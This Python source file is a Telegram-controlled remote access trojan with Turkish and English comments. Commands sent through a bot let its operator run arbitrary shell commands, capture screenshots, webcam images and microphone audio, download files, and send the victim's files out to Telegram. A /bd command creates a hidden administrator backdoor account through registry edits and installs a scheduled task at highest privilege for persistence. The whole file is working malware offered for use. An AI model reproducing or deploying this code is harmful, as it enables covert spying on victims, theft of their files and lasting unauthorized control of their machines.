#!/usr/bin/python
#Ny4rlk0's Remote Terminal Telegram Access Tool
#Programı ben yazmış olabilirim ama kullananlara hiçbir şekilde garanti vermemekteyim.
#Tamamiyle kendi sorumluluğunuzla kullanın.
#Ny4rlk0 hiçbir yasal sorumluluk kabul etmemektedir.
#Ny4rlk0 does not accept any kind of legal liability from this program. Use it at your own risk!
#https://github.com/ny4rlk0/Telegram-ile-Uzaktan-Erisim-Araci-Remote-Access-Tool-with-Telegram/
#BTC: 3NhGAPpkLas1pDdPp7tSeP5ba1gHapq7kb
import telepot,telepot.loop,telepot.namedtuple
import sqlite3,threading,os,time,pprint,random,validators,base64,json,subprocess
import configparser as c
import subprocess as sp
import requests as rq
from PIL import ImageGrab as sc
import socket
import sounddevice as sd
from scipy.io.wavfile import write
from shutil import copyfile
import cv2

nya=0
rlko=0
settings_name="settings.txt"
username="ratadmin" #Backdoor username. Arka kapı kullanıcı adımız. Değiştirmeyi arka kapıyı /bd komutuyla açmadan yapın. Settings.txt değiştirin burayla birlikte.
password="ratpassword" #Backdoor password. Arka kapı şifremiz.
lang="tr" #For english type en in settings.txt. Türkçe için settings.txt içine langue karşısına tr yazın.
xROOT_ACCESS=95454545 #Let'secure our access to computer with Telegram user id. Bilgisayara erişimimizi telegram id'miz ile güvenceye alalım.
xTOXEN="12341321:DA2doSKDWAD232SD2sDW23S" #Add your own toxen here. Buraya kendi toxeninizi yazın.
startup_taskname="RemoteAccessTool"
fname="EagleEye.jpg"
#WARNING: Software reads most of the values from .txt file called settings so even if you changed here if its wrong there it will not work!
#UYARI: Yazılım bu değerlerin çoğunluğunu settings.txt içinden okuyor. Burada doğru bile olsa settings.txt yanlışsa çalışmaz.
#Buradaki değerler sadece size örnek bir dosya oluşturması için var.
db_exists=os.path.exists("database.db")
conn=sqlite3.connect("database.db", check_same_thread=False)
cur=conn.cursor()
xdir=os.getcwd()
softwarename=os.path.basename(__file__)
software_rundir=os.path.join(xdir,softwarename)
try:
    systemdrive=str(os.getenv('SYSTEMDRIVE'))+"\\"
except:
    systemdrive="C:"
    pass
startup_path=str(systemdrive)+str(softwarename)#Windows installed drive + Ex name. Windowsun kurulu olduğu disk + programın exe dosyası
xml_name="RemoteAccessTool.xml" #XML name for schedule task in windows. Windowsta görev zamanlamak için XML dosyası adı.
xml_path=str(systemdrive)+str(xml_name) #Schedule tasks XML file. Görev zamanlamaya yazılacak xml dosyası.

#YAPILACAKLAR
#Programın kendi kendini sistemden silebilmesini sağla.
#YAZILIMI .exe HALINE GETIR VE GITHUBA YUKLE. (.exe yaparken pprint çıkar.)
#Ses dosyalarının boyutu çok büyük bir ara bakmak lazım. Yada sürekli ses kayıt modu ekle 2 dk dolunca atsın kayda devam etsin.
#Başlangıçta düzgün başlamıyor. Düzelt.
if not db_exists:
    cur.execute("CREATE TABLE user (id INT, username CHAR(50), firstname VARCHAR(51),lastname CHAR(52))")
    conn.commit()
    del cur
set_exists=os.path.exists(settings_name)
if not set_exists:
    cp = c.RawConfigParser()
    cp.add_section('Settings')
    cp.set('Settings', 'TOXEN', xTOXEN)
    cp.set('Settings', 'ROOT_ACCESS', xROOT_ACCESS)
    cp.set('Settings', 'Langue', lang)
    cp.set('Settings', 'Username', username)
    cp.set('Settings', 'Password', password)
    cp.set('Settings', 'Xml_Name', xml_name)
    cp.set('Settings', 'Startup_Taskname', startup_taskname)
    setup = open(settings_name, 'w')
    cp.write(setup)
    setup.close()
#READ SETTINGS FROM -settings.txt. Ayarları settings.txt üzerinden oku.
nya = c.RawConfigParser()
nya.read(settings_name)
TOXEN = nya['Settings'] ['TOXEN']
ROOT_ACCESS = [int(nya['Settings'] ['ROOT_ACCESS'])] #Burada en dıştaki köşeli parantez listeye çeviriyor bunu yoksa direkt string sanıyor kendini.
lang = nya['Settings'] ['Langue']
username = nya['Settings'] ['Username']
password = nya['Settings'] ['Password']
xml_name = nya['Settings'] ['Xml_name']
startup_taskname = nya['Settings'] ['Startup_Taskname']
bot = telepot.Bot(TOXEN)
try:
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
except:
    if lang=="tr":
        ip="Bilinmiyor."
        hostname="Bilinmiyor."
    else:
        ip="Unknown."
        hostname="Unknown."
    pass
try:
    external_ip = rq.get('https://api.ipify.org').text
except:
    if lang=="tr":
        external_ip="Bilinmiyor."
    else:
        external_ip="Unknown."
    pass
try:
    Author=f"{hostname}\{username}"
except:
    pass
def chk_file(filepath):
    chk= os.path.exists(filepath)
    if chk:
        os.remove(filepath)
def get_sid(insert_username):
    global sid
    try:
        temp_sid=str(sp.getoutput(f"""wmic useraccount where name="{username}" get sid"""))
        temp_sid=temp_sid.replace("SID","")
        sid=temp_sid.strip()
    except:
        sid="In_case_of_any_error" #In case of throwing error on linux. Belki linuxdada çevirmeye çalışırda kafamıza hata fırlatır. Yok ben almıyım, sağol.
        return sid
    else:
        return sid
task_scheduler_xml=f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2021-06-23T22:45:12.4812783</Date>
    <Author>{Author}</Author>
    <URI>\RemoteAccessTool</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>{get_sid(username)}</UserId>
      <LogonType>Password</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>StopExisting</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>999</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{startup_path}</Command>
    </Exec>
  </Actions>
</Task>"""
tr_menu=telepot.namedtuple.ReplyKeyboardMarkup(
    keyboard=[
        [telepot.namedtuple.KeyboardButton(text="/userid"),
        telepot.namedtuple.KeyboardButton(text="/rec 120"),
        telepot.namedtuple.KeyboardButton(text="/bd")],
        [telepot.namedtuple.KeyboardButton(text="/ss"),
        telepot.namedtuple.KeyboardButton(text="/cam"),
        telepot.namedtuple.KeyboardButton(text="/ip"),
        telepot.namedtuple.KeyboardButton(text="/yardim")]
    ],
    resize_keyboard=True
)
en_menu=telepot.namedtuple.ReplyKeyboardMarkup(
    keyboard=[
        [telepot.namedtuple.KeyboardButton(text="/userid"),
        telepot.namedtuple.KeyboardButton(text="/rec 120"),
        telepot.namedtuple.KeyboardButton(text="/bd")],
        [telepot.namedtuple.KeyboardButton(text="/ss"),
        telepot.namedtuple.KeyboardButton(text="/cam"),
        telepot.namedtuple.KeyboardButton(text="/ip"),
        telepot.namedtuple.KeyboardButton(text="/help")]
    ],
    resize_keyboard=True
)
def add_win_backdoor():
    if os.name=="nt":
        try:
            out1=sp.call(['net', 'user', '/add', username, password])  #Add backdoor user. Arka kapı kullanıcısı ekleyelim.
            out2=sp.call(['net', 'localgroup', 'administrators', username, '/add']) #Grant user to Admin permissions. Admin yetkisi verelim.
            out3=sp.call(['REG', 'ADD', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts', '/f'])#To hide user. Kullanıcıyı gizlemek için regediti editleyelim.
            out4=sp.call(['REG', 'ADD', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList', '/f']) #same
            out5=sp.call(['REG', 'ADD', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList', '/v', username, '/t', 'REG_DWORD', '/d', '0', '/f']) #Change "/d 0" to "/d 1" if you want account to visible. Hesabın gözükmesini istiyorsanız "/d 0" yu "/d 1" olarak değişin.
            sid=get_sid(username)
            xmlfile=open(xml_path,"w") #Open file to write. (for read use "r" for write "w") Dosyayı yazmak için açalım. (okumak için "r" yazmak için "w")
            xmlfile.write(str(task_scheduler_xml))
            xmlfile.close()
            xml_copy=xdir+"\\"+xml_name
            settings_copy=xdir+"\\"+settings_name
            if not os.path.exists(systemdrive+xml_name):
                copyfile(xml_copy, systemdrive)
            if not os.path.exists(systemdrive+settings_name):
                copyfile(settings_copy, systemdrive+settings_name)
            if not os.path.exists(systemdrive+softwarename):
                copyfile(software_rundir, systemdrive+softwarename)
            out7=sp.call(['schtasks.exe', '/create', '/tn', startup_taskname, '/XML', xml_path, '/ru', Author, '/rp', password]) #Add our Sofware to login. Programımızı başlangıça atayalım.
        except Exception as e:
            globalMessage(e+"add_win_backdoor")
            pass
    else:
        if lang=="tr":
            globalMessage("Uyarı: Sadece windows işletim sisteminde destekleniyor.\nErişim Reddedildi.")
        else:
            globalMessage("Warning: Backdoor only supported at Windows OS.\nAccess Denied!")
def remove_win_backdoor():
    if os.name=="nt":
        try:
            #Add reversing option here.
            out1=sp.call(['net','user','/delete', username])
            out2=sp.call(['REG', 'DELETE', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts', '/f'])
            out3=sp.call(['schtasks', '/delete', '/tn', startup_taskname,'/f'])
        except Exception as e:
            globalMessage(e+"\nremove_win_backdoor")
def webcam_shot():
    campath=os.path.join(xdir,fname)
    chk_file(campath)
    if os.name=="nt":    
        try:
            key=cv2.waitKey(1)
            webcam=cv2.VideoCapture(0)#, cv2.CAP_DSHOW)
            check,frame=webcam.read()
            cv2.imwrite(filename=campath, img=frame)
            webcam.release()
        except:
            webcam.release()
            pass
        else:
            sendFile(campath,True)
    else:
        if lang=="tr":
            globalMessage("Hata: Bu özellik sadece windowsa özeldir.")
        else:
            globalMessage("Error:This is only usable in Windows.")
def access(command): #Access the terminal. Komut satırına erişim.
    global output
    try:
        output = sp.getoutput(f"""{command}""")
        globalMessage(output)
    except Exception as e:
        globalMessage(e)
        pass
def eagleye(): #Capture screen photo. Ekran resmini kaydet.
    try:
        ss_name="EagleEye.jpg"
        ss_path=os.path.join(xdir,ss_name)
        chk_file(ss_path) #If same file at same path exists lets just delete. Aynı dosya aynı yolda bulunuyorsa silelim.
        ss=sc.grab()
        ss.save(ss_path)
        sendImg(ss_path)
    except:
        pass
def batears(battime): #Capture the microphone. Bilgisayarın mikrofonunu kaydet.
    #time=time*60 #Convert to minute. Saniyeyi dakikaya çevirelim. 
    #Bunu ekleyecektim ama uzun süreler ses kaydı yapmak için çıkan kaydı mp3 dönüştürmek gerekiyor.
    #FFmpeg kütüphaneside 40 mb aşağı değil. Arttırmak istemedim daha yazılımın boyutunu.
    #Ekleyince 2 dk olan kayıt limitini 6 dk çıkarabiliyorum. wav olarak kaydedip mp3 dönüştürüyor.
    #Bu kadar sıkıntının asıl sebebi ise telegram botlara 50 mb upload sınırı koyması. Ses kaydı
    #Aşınca 50 mb hata vericek. O yuzden sınırlı.
    #Arşivlemeyide deneyebilirdim ama sonra bakarız belki.
    batname="batears.wav"
    batpath=os.path.join(xdir,batname)
    try:
        freq=44100 #Sample rate
        sd.default.samplerate=freq
        sd.default.channels=2
        recr=sd.rec(int(battime*freq), dtype='float32') #Uses alot of disk space while recording. Kayıt ederken çok fazla alan kullanıyor.
        sd.wait() #Wait until rec finish.
        write(batname,freq,recr) #Save file.
        sendFile(batpath,True)
    except:
        pass
def download(url,filename):
    try:
        r = rq.get(url, allow_redirects=True)
        open(filename, 'wb').write(r.content)
    except:
        pass
def handle(msg):
   global userid,chatid
   try:
    #pprint.pprint(msg)
    cur=conn.cursor()
    et="@"
    userid=msg["from"]["id"]
    chatid=msg["chat"]["id"]
    try:
        username=et+msg["from"]["username"]
    except:
        username=""
    try:
        firstname=msg["from"]["first_name"]
    except:
        firstname=""
    try:
        lastname=msg["from"]["last_name"]
    except:
        lastname=""
    data=""
    if "data" in msg.keys():
        data=msg["data"]
    text=""
    if "document" in msg.keys():
        text="FileID:"+msg["document"]["file_id"]
    elif "photo" in msg.keys():
        text="FileID:"+msg["photo"][0]["file_id"]
    else:
        text=msg["text"]
    global sendFile,globalMessage,sendImg
    def globalMessage(msg):
        try:
            msg=str(msg)
            bot.sendMessage(f"{msg}")
        except:
            pass
    def sendFile(filename,removefile):
        try:
            bot.sendDocument(chatid,open(filename,"rb"))#fileid)
            if removefile==True:
                os.remove(filename)
        except Exception as e:
            bot.sendMessage(chatid,e)
            pass
    def sendImg(spath): #Send screen capture image to telegram. Telegram hesabımıza ekran görüntüsünü yollayalım.
        try:
            bot.sendPhoto(chatid, photo=open(spath, 'rb'))
            os.remove(spath) #Delete the file after sent. Yolladıktan sonra dosyayı silelim.
        except:
            pass
    if text.startswith("/x ") and userid in ROOT_ACCESS: #Check if user has rights to access our computer via telegram id. Kullanıcının bilgisayarımıza erişimi olup olmadığınız telegram id ile konrol edelim.
        execute=text.replace("/x ","")
        access(execute)
        bot.sendMessage(chatid,f"{output}")
    elif text.startswith("/userid"):
        if lang=="tr":
            bot.sendMessage(chatid,f"Sizin User ID'niz: {userid}\nBu bilgiyi kimse ile paylaşmayınız.")
        else:
            bot.sendMessage(chatid,f"Your User ID is: {userid}\nDo not share this information to anyone.")
    elif text=="/yardim" or text=="/help" or text=="/menu" or text=="/menü":
        if lang=="tr":
            bot.sendMessage(chatid,"Nyarlko tarafından yazılmıştır.\nhttps://github.com/ny4rlk0/Telegram-ile-Uzaktan-Erisim-Araci-Remote-Access-Tool-with-Telegram/\nKomutlar:\n/x Komut satırına yazacağın komut.\n/ss Ekran alıntısını alır ve sana yollar.\n/d https://indirme.linki dosyadi.exe Dosyayı bilgisayarınıza indirir.\n/ip Ip adresinizi gösterir.\n/userid User ID numaranızı gösterir.\n/rec 1-120 Saniye cinsinden bilgisayara bağlı mikrofon ile kayıt yapar.\nNot: Kayıt yaparken Windows altta mikrofon simgesi çıkarıyor.\n/menu bu menüyü açar.\n/up C:/a.txt dosyasını telegrama yükler.\nDikkat: 50 MB üstü dosyaları yükleyemezsiniz.\n/bd programı başlangıca atayarak Windowsta arka kapı açar.\n/rbd Windows arka kapısını tamamiyle kaldırır.\n/cam Webcam takılı ise resim çeker.",reply_markup=tr_menu)
        else:
            bot.sendMessage(chatid,"Written by Nyarlko.\nhttps://github.com/ny4rlk0/Telegram-ile-Uzaktan-Erisim-Araci-Remote-Access-Tool-with-Telegram/\nCommands:\n/x Command you wanna execute.\n/ss screenshot the computer.\n/d https://download.link filename.exe Downloads the file.\n/ip Shows your ip address.\n/userid Will show your User ID number.\n/rec 1-120 (Sec) Will record from computers microphone and send you as wav file.\nWarning: Windows shows microphone icon at taskbar.\n/menu will open this menu.\n/up C:/a.txt uploads a.txt to telegram.\nWarning: You can not upload files bigger than 50 MB.\n/bd will add backdoor to Windows.\n/rbd will remove backdoor from windows.\n/cam If webcam is connected it will send us picture.",reply_markup=en_menu)
        if userid in ROOT_ACCESS:
            if lang=="tr":
                bot.sendMessage(chatid,"Admin yetkiniz vardır.")
            else:
                bot.sendMessage(chatid,"You have Admin access.")
        else:
            if lang=="tr":
                bot.sendMessage(chatid,"Admin yetkiniz yoktur.")
            else:
                bot.sendMessage(chatid,"You don't have Admin access.")
    elif text.startswith("/ss") and userid in ROOT_ACCESS:
        eagleye()
        sendImg()
    elif text.startswith("/d ") and userid in ROOT_ACCESS:
        try:
            url=text.replace("/d ","")
            url,filename=url.split(" ")
            try:
                download(url,filename)
            except:
                if lang=="tr":
                    bot.sendMessage(chatid,f"{filename} indirilirken hata ile karşılaşıldı.")
                else:
                    bot.sendMessage(chatid,f"Failed while downloading {filename}.")
                pass
            else:
                if lang=="tr":
                    bot.sendMessage(chatid,f"{filename} başarıyla indirildi.")
                else:
                    bot.sendMessage(chatid,f"{filename} downloaded successfully.")
        except:
            pass
    elif text.startswith("/ip") and userid in ROOT_ACCESS:
        if lang=="tr":
            bot.sendMessage(chatid,f"Dahili IP: {ip}\nHost Adı: {hostname}\nHarici IP: {external_ip}")
        else:
            bot.sendMessage(chatid,f"Internal IP: {ip}\nHost Name: {hostname}\nExternal IP: {external_ip}")
    elif text.startswith("/rec ") and userid in ROOT_ACCESS:
        size_check=True
        battime=text.replace("/rec ","")
        try:
            battime=int(battime)
        except Exception as e:
            size_check=False
            if lang=="tr":
                bot.sendMessage(chatid,f"{e}\nÖzet olarak diyor ki; sayı yazacağın yere neden saçma saçma şeyler yazıyosun.")
            else:
                bot.sendMessage(chatid,f"{e}\nPlease type a number.")
            pass
        if battime > 120 or battime < 0:
            size_check=False
            if lang=="tr":
                bot.sendMessage(chatid,f"120 saniyeden fazla ses kaydı yapamazsınız.")
            else:
                bot.sendMessage(chatid,f"""Can't record more then 120 seconds.""")
        try:
            if size_check==True:
                batears(battime)
        except:
            pass
    elif text.startswith("/cam") and userid in ROOT_ACCESS:
        webcam_shot()
    elif text.startswith("/bd") and userid in ROOT_ACCESS: #ADD BACKDOOOR TO WINDOWS. Windowsa arka kapı aç.
        add_win_backdoor()
    elif text.startswith("/rbd") and userid in ROOT_ACCESS: #REMOVE BACKDOOR FROM WINDOWS. Windows arka kapısını kapa.
        remove_win_backdoor()
    elif text.startswith("/up ") and userid in ROOT_ACCESS:
        file_dir=text.replace("/up ","")
        try: #Execute. Çalıştır.
            file_size=os.path.getsize(file_dir)
        except: #Error. Hata.
            if lang=="tr":
                bot.sendMessage(chatid,"Dosya bulunamadı!")
            else:
                bot.sendMessage(chatid,"File not found.")
        else: #Succesfull. Başarılı.
            if file_size <= 50000000: #İf file size smaller then 50 mb since its telegrams bot limit. Dosya boyutu 50 mb küçükse telegramın bot limiti bu üstünü kabul etmiyor.
                sendFile(file_dir,False)
            else:
                if lang=="tr":
                    bot.sendMessage(chatid,f"Dosya boyutu telegramın botlar için sınırı olan 50 MB'tan büyük!")
                else:
                    bot.sendMessage(chatid,f"File size is bigger than 50 MB.\nThis is limitation from telegram for bot api.")
   except:
    pass
if __name__=="__main__":
    telepot.loop.MessageLoop(bot,handle).run_forever()
